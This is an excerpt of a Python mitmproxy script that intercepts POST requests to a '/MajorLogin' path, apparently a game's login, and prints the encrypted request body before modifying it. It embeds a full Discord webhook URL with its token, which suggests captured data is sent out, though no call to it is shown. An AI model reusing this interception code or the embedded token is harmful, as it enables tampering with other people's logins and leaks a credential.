...
import copy
import time
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1462000852653969606/mjqJRry70vLGTZ-LbSuEUBLJ0DXAmSTxJk4YTTT_Ui7E2qWuLZB-Q93d-JIHgc8ke1o3"
...
def request(flow: http.HTTPFlow) -> None:
    if flow.request.method.upper() == "POST" and "/MajorLogin" in flow.request.path:
        try:
            # Store original encrypted proto
            request_bytes = flow.request.content
            original_encrypted_proto = request_bytes.hex()
            
            # Print original encrypted proto in same format as MOBILE_PROTO
            print("\n" + "="*80)
            print("ORIGINAL ENCRYPTED PROTO (before modification):")
            print("="*80)
            print(original_encrypted_proto)
            print("="*80 + "\n")
            
            # Continue with existing decryption and processing
